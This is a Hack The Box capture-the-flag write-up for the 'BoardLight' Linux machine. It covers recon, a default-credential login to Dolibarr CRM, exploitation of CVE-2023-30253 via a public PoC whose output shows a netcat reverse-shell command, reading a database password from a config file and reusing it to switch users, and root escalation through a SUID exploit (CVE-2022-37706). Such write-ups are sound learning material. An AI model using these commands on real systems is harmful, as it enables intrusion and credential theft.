---
tags:
  - linux
  - hack
names:
  - boardlight
os: Linux
flag_user: false
flag_system: false
revisit: true
---
# HTB: [BoardLight](https://app.hackthebox.com/machines/BoardLight)

> [!tip]- Spoiler Summary
> This Linux box is running a vulnerable version of Dolibarr CRM which can be exploited for Authenticated RCE; the login is easily guessable. Credential hunting uncovers the MariaDB password for the CRM, and while there are no useful hashes available there the password is also the same as for the admin user, `larissa`. PE is possible via a bug in `enlightenment_sys`, a SUID binary.

## Services

### TCP

```console
$ sudo nmap -v -sCV -p- -T4 --min-rate 10000 -oN nmap_tcp t
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 09:42 CST
...
Nmap scan report for t (10.10.11.11)
Host is up (0.098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

#### 80/tcp-http

```console
$ whatweb -a3 http://t
http://t [200 OK] Apache[2.4.41], Bootstrap[4.3.1], Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
```

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://t/ -H 'Host: FUZZ.board.htb' -ac
...
________________________________________________
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 131ms]
```

Added `crm.board.htb` to `/etc/hosts`.

## RCE

Credentials `admin:admin` work.

[CVE-2023-30253](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30253) says:

> Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: `<?PHP` instead of `<?php` in injected data.

I use the panel to create a new site.

Per the CVE, I'll use uppercase `PHP` for the PHP shellcode.

Unfortunately, my saved pages kept disappearing. I think HTB is resetting the state via cron or something. So, I'll need an automated way to do it more quickly. There is a [PoC](https://github.com/Rubikcuv5/cve-2023-30253) available which predates this HTB challenge but otherwise seems tailored specifically for it, including the vhost name. I'm guessing the author of this challenge wrote the PoC?

```console
$ pip3 install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: beautifulsoup4==4.12.3 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (4.12.3)
...

  kali@kali:~/boardlight/cve-2023-30253 (main)
$ python3 ./CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.14.2 443
Traceback (most recent call last):
  File "/home/kali/boardlight/cve-2023-30253/./CVE-2023-30253.py", line 319, in <module>
    main()
  File "/home/kali/boardlight/cve-2023-30253/./CVE-2023-30253.py", line 300, in main
    print(f"{Fore.CYAN}{pyfiglet.figlet_format('CVE', font='isometric1')}{Style.RESET_ALL}")
                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pyfiglet/__init__.py", line 67, in figlet_format
    fig = Figlet(font, **kwargs)
          ^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pyfiglet/__init__.py", line 862, in __init__
    self.setFont()
  File "/usr/lib/python3/dist-packages/pyfiglet/__init__.py", line 869, in setFont
    self.Font = FigletFont(font=self.font)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pyfiglet/__init__.py", line 128, in __init__
    self.data = self.preloadFont(font)
                ^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pyfiglet/__init__.py", line 168, in preloadFont
    raise FontNotFound(font)
pyfiglet.FontNotFound: isometric1
^ rc=1
```

Odd to have a PoC fail for its font choice! I modified this line to make it work:

```python
300     #print(f"{Fore.CYAN}{pyfiglet.figlet_format('CVE', font='isometric1')}{Style.RESET_ALL}")
301     print(f"{Fore.CYAN}{pyfiglet.figlet_format('CVE')}{Style.RESET_ALL}")
```

```console
$ python3 ./CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.14.2 443
  ______     _______
 / ___\ \   / / ____|
| |    \ \ / /|  _|
| |___  \ V / | |___
 \____|  \_/  |_____|
 ___ __ ___ ____   ____ __ ___ ___ ____
|_  )  \_  )__ /__|__ //  \_  ) __|__ /
 / / () / / |_ \___|_ \ () / /|__ \|_ \
/___\__/___|___/  |___/\__/___|___/___/
[+] By Rubikcuv5.
[*] Url: http://crm.board.htb
[*] User: admin
[*] Password: admin
[*] Reverseshell info:
        IP:10.10.14.2
        PORT:443
[*] Verifying accessibility of URL:http://crm.board.htb/admin/index.php
[*] Attempting login to http://crm.board.htb/admin/index.php as admin
[+] Login successfully!
[*] Creating web site ...
[+] Web site was create successfully!
[*] Creating web page ...
[+] Web page was create successfully!
[▄] Trying to bind to :: on port 443: Trying ::
Exception in thread Thread-1 (initial_listener):
Traceback (most recent call last):
  File "/usr/lib/python3.11/threading.py", line 1045, in _bootstrap_inner
[*] Executing command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.2 443 >/tmp/f
    self.run()
  File "/usr/lib/python3.11/threading.py", line 982, in run
    self._target(*self._args, **self._kwargs)
  File "/home/kali/boardlight/cve-2023-30253/./CVE-2023-30253.py", line 297, in initial_listener
    shell = listen(port, timeout=20).wait_for_connection()
            ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/listen.py", line 108, in __init__
    listen_sock.bind(self.sockaddr)
OSError: [Errno 98] Address already in use
[-] An error occurred: 504 Server Error: Gateway Timeout for url: http://crm.board.htb/website/index.php?website=test123&pageid=11&action=setshowsubcontainers&token=9286ebeeb9bfce845bd2ccbbe1686edf
```

Strangely enough, I get a reverse shell in spite of the error above.

```console
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.11] 38158
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now I need to find a way to PE or get access as the admin user, `larissa`.

```console
www-data@boardlight:/dev/shm$ netstat -lnpt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

Found database credentials:

```console
www-data@boardlight:~/html/crm.board.htb$ cat htdocs/conf/conf.php
<?php
...
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
...
```

```console
www-data@boardlight:~/html/crm.board.htb$ mysql -u dolibarrowner -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 705
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
Copyright (c) 2000, 2024, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql>
```

I found user hashes but they look like bcrypt/Blowfish hashes, which are very slow to crack. I connected to the other MariaDB instance on port 33060, but the hashes are the same.

I realized way too late that the previously discovered password `serverfun2$2023!!` also works for the user `larissa`:

```console
www-data@boardlight:/dev/shm/$ su - larissa
Password:
larissa@boardlight:~$ cat user.txt
09148f...
```

## PE

```console
larissa@boardlight:/home$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
...
```

The `enlightenment_sys` binary has a PE bug: <https://www.exploit-db.com/exploits/51180>

Using [this exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main) works as is:

```console
larissa@boardlight:/dev/shm$ bash ./x.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# cat /root/root.txt
9b2afb...
```
